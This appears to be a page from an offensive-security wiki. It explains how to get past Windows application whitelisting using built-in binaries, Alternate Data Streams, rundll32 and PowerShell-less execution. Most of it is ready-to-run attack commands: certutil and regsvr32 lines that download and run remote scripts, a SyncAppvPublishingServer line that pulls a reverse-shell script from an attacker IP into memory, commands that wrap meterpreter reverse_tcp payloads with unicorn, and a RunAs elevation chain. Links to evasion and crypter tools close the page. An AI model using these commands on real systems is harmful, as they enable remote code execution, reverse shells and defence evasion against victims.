# ⭕ Basic Tricks

## <mark style="color:red;">LOLBins</mark>

Using [LOLBins](https://lolbas-project.github.io) we can bypass some protections and execute malicious payloads.

{% embed url="https://lolbas-project.github.io" %}

{% hint style="info" %}
To search for a specific function in LOL binaries, use `/function` key word. for example : `/execute`
{% endhint %}

## <mark style="color:red;">Alternate Data Streams</mark>

#### Execute a `.EXE` file stored as an Alternate Data Stream (ADS)

```
wmic.exe process call create "c:\ads\file.txt:program.exe"
```

Download and save a PS1 file to an Alternate Data Stream (ADS).

```
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
```

Add content to an Alternate Data Stream (ADS).

```
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat
```

Execute evil.dll which is stored in an Alternate Data Stream (ADS).

```
control.exe c:\windows\tasks\file.txt:evil.dll
```

Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS).

```
cscript c:\ads\file.txt:script.vbs
```

## <mark style="color:red;">Using DLLs & macros</mark>

We can create a DLL containing a Metasploit payload and then run it on the victim system via the rundll32.exe available in all versions of Windows. This is often available, even with SRP enabled, as it is located in C:\Windows and is not restricted by default in many SRP deployments. Scripts and macro payloads are also valuable. Macros especially tend to be allowed for complicated forms and other Office document functionality.

```
C:\> rundll32.exe reverse_shell.dll,Main
```

After we execute the command rundll32.exe CALC.dll,DoesntExist, our DLL will be loaded into memory, and our embedded Metasploit payload will be run through the initialization code. The DoesntExist parameter needs to be included, but it does not have to be a real function exported by the DLL

#### <mark style="color:green;">example:</mark>

copy cmd.exe to another location with another name and windows screen saver file format then use rundll32.exe to execute the binary:

```
copy c:\windows\system32\cmd.exe c:\cmd.scr
rundll32.exe desk.cpl,InstallScreenSaver c:\cmd.scr
```

## <mark style="color:red;">Powershell without powershell.exe</mark>

Powershell.exe is just a process hosting the System.Management.Automation.dll which essentially is the actual Powershell as we know it.

If you run into a situation where powershell.exe is blocked and no strict application whitelisting is implemented, there are ways to execute powershell still.

```
rundll32.exe PowerShdll.dll,main
```

### <mark style="color:orange;">SyncAppvPublishingServer</mark>

Windows 10 comes with `SyncAppvPublishingServer.exe and` `SyncAppvPublishingServer.vbs` that can be abused with code injection to execute powershell commands from a Microsoft signed script:

```
SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
```

example:

#### <mark style="color:green;">getting a reverse shell with SyncAppvPublishingServer and powershell.</mark>

generate a powershell payload and serve it on the network, use this command to call powershell from vba and load the payload in memory.

```
SyncAppvPublishingServer.vbs "Break; iex(new-object system.net.webclient).downloadstring('http://192.168.56.1/rev.ps1')"
```

{% hint style="info" %}
#### This technique can easily bypass application whitelisting.
{% endhint %}

{% embed url="https://youtu.be/7tvfb9poTKg" %}

{% embed url="https://github.com/p3nt4/PowerShdll" %}

### <mark style="color:orange;">BYOPS</mark>

#### Bring your own powershell, any application that can use the .Net DLL to execute powershell commands.

{% embed url="https://github.com/leechristensen/UnmanagedPowerShell" %}

{% embed url="https://github.com/bitsadmin/nopowershell" %}

## <mark style="color:red;">Using Payload Wrappers</mark>

we can use various open source payload wrappers that add an extra layer to msfvenom payloads. not much of an FUD payload, but still effective.

{% embed url="https://github.com/trustedsec/unicorn" %}

for example with unicorn tool:

```
unicorn.py windows/meterpreter/reverse_tcp X.X.X.X 443 hta
```

or

```
python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde
```

## <mark style="color:red;">System DLLs</mark>

we can use functions from system DLLs such as CMD screensaver.

```
C:\Windows> copy System32\cmd.exe Temp\cmd.scr
C:\Windows> rundll32.exe desk.cpl,InstallScreenSaver
```

## <mark style="color:red;">Multi-level Execution</mark>

By using multiple levels of execution, it could be possible to stumble into one that is explicitly allowed or has special privileges. Here we see `cmd.exe` running `cscript.exe`, which runs a VBS script included with Windows. This script can be abused to run other things. A great side effect of using this script: it is signed by Microsoft, and therefore often explicitly allowed to run. Then the PowerShell process is started, using a `“- Verb RunAs”` argument which attempts to re-establish `“High Integrity”` context, essentially giving an administrative user back their administration rights.

```
cmd.exe /c cscript.exe \windows\system32\SyncAppvPublishingServer.vbs ".;Start-Process rundll32.exe 'shell32.dll,ShellExec_runDLL cmd.exe' -Verb RunAs" 
```

we can do the same with powershell:

```
Powershell.exe -Command Set-ExecutionPolicy RemoteSigned -Scope Process; Powershell.exe -File "path to master script"
```

## <mark style="color:red;">Evasion Tools and Frameworks</mark>

{% embed url="https://github.com/hlldz/SpookFlare" %}

## <mark style="color:red;">Runners & Crypters</mark>

{% embed url="https://github.com/spyblocker/OSEP-Breaking-Chains" %}
